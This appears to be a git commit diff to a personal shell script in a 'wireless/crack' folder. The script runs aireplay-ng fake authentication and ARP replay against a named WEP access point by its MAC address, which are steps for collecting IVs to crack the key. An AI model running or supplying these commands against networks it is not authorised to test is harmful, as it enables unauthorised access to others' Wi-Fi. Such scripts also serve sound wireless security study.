d9aa7117f67477a3c27160f801e62b269439e92b
Rowan Pang <pangweizhen.2008@hotmail.com>
2017-06-22 16:09:01 +0800

    optimize folder name

--- net/wireless/crack/phome-wndr-wepOpenSystem/s2.sh
+++ net/wireless/crack/phome-wndr-wepOpenSystem/s2.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
 #Step 4 - Use aireplay-ng to do a fake authentication with the access point
-    aireplay-ng -1 0 -e phome-wndr -a 6C:B0:CE:17:AD:71 -h 40:e2:30:e6:ef:54
+    aireplay-ng -1 0 -e phome-wndr -a 6C:B0:CE:17:AD:71 -h 40:e2:30:e6:ef:54 wlp2s0mon
 
 #Step 5 - Start aireplay-ng in ARP request replay mode
     aireplay-ng -3 -b 6C:B0:CE:17:AD:71 -h 40:e2:30:e6:ef:54 wlp2s0mon			#for grab ivs.
